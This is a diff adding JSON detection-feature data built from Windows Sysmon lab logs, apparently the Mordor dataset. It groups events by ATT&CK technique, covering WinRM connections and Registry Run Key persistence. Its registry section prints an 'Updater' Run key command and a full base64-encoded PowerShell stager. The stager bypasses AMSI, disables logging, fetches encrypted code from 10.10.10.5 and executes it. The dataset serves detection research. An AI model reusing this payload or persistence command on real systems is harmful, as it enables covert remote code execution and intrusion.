+            "dst_ip": "172.18.38.6",
+            "src_port": 64876,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64874,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64875,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64877,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64882,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64883,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64881,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64880,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64879,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64878,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64884,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          }
+        ]
+      },
+      "persistence": {
+        "registry_signals": [],
+        "registry_noise": [],
+        "registry_noise_count": 0,
+        "dropped_files": []
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  },
+  {
+    "group_id": "T1547_001_284",
+    "technique_id": "T1547.001",
+    "technique_name": "Registry Run Keys / Startup Folder",
+    "anchor_eid": 13,
+    "anchor_detail": {
+      "eid": 13,
+      "time": "2020-07-22 04:19:05.132000+00:00",
+      "image": "powershell.exe",
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "user": null,
+      "integrity": null
+    },
+    "confidence": 0.33,
+    "all_idxs": [
+      128,
+      189,
+      194,
+      282,
+      284,
+      287,
+      295,
+      426,
+      427,
+      452,
+      470,
+      492,
+      496,
+      517,
+      528,
+      564,
+      579,
+      581,
+      613,
+      617
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "powershell.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "svchost.exe",
+            "parent_image": null,
+            "source_eid": 11
+          }
+        ],
+        "chain_depth": 2
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 3,
+        "user": "MORDOR\\pgustavo",
+        "domain": "NT AUTHORITY",
+        "logon_id": null,
+        "integrity_level": null,
+        "user_sid": null,
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:19:05.132000+00:00",
+        "window_start_delta_sec": -9.09,
+        "window_end_delta_sec": 28.22,
+        "span_sec": 37.31,
+        "total_events": 20,
+        "event_density_per_10sec": 5.36,
+        "eid_counts": {
+          "3": 9,
+          "12": 8,
+          "13": 2,
+          "11": 1
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 4.036,
+          "mean_sec": 1.963
+        },
+        "burst_detected": [
+          {
+            "eid": 3,
+            "count": 9,
+            "window_sec": 7.08
+          },
+          {
+            "eid": 12,
+            "count": 8,
+            "window_sec": 5.05
+          }
+        ]
+      },
+      "network": {
+        "connections": [
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51071,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51072,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51074,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51073,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51077,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51078,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51079,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51080,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51082,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          }
+        ]
+      },
+      "persistence": {
+        "registry_signals": [
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+            "details": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x\"",
+            "process_guid": "{b59756a9-b239-5f17-5307-000000000400}",
+            "image": "powershell.exe"
+          }
+        ],
+        "registry_noise": [
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug",
+            "details": "SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAQQBsAH0ARQBsAHMAZQB7AFsAUwBDAFIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AGUAKAAkAG4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAE8ATABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAHMASABTAGUAVABbAFMAVAByAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBsAGwALAAkAFQAUgB1AEUAKQA7AH0AOwBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBTAEUAUgBWAGkAQwBlAFAATwBJAE4AdABNAGEATgBBAEcAZQBSAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAEEAOQA0ADgANgA9AE4ARQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAcwBUAGUAbQAuAE4ARQBUAC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AQwBPAGQASQBuAEcAXQA6ADoAVQBOAEkAYwBvAGQAZQAuAEcAZQB0AFMAVAByAGkAbgBnACgAWwBDAG8ATgBWAEUAUgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABhADkANAA4ADYALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkAPQBbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBXAEUAYgBSAEUAUQB1AEUAcwBUAF0AOgA6AEQARQBmAGEAdQBsAHQAVwBFAGIAUAByAG8AWABZADsAJABhADkANAA4ADYALgBQAHIATwBYAHkALgBDAHIARQBEAEUAbgBUAEkAYQBsAFMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABFAE4AdABJAGEAbABDAGEAQwBoAEUAXQA6ADoARABFAGYAYQBVAEwAdABOAEUAVABXAG8AUgBrAEMAcgBlAEQAZQBuAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQARQBNAC4AVABFAHgAVAAuAEUAbgBDAG8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAVABFAFMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGEAOQA0ADgANgAuAEgAZQBBAGQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AE8AdgBQAHYAYgB5AG0AZAAwAGIAVgBnAE0AUABxADQAZQA4AGIANABVAEcAMwBXAEsAbQBNAD0AIgApADsAJABkAEEAVABBAD0AJABBADkANAA4ADYALgBEAG8AdwBuAEwATwBBAGQARABBAFQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
+            "process_guid": "{b59756a9-b239-5f17-5307-000000000400}",
+            "image": "powershell.exe"
+          }
+        ],
+        "registry_noise_count": 1,
+        "dropped_files": [
+          {
+            "source_eid": 11,
+            "path": "C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat",
+            "image": "svchost.exe"
+          }
+        ]
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  }
+]
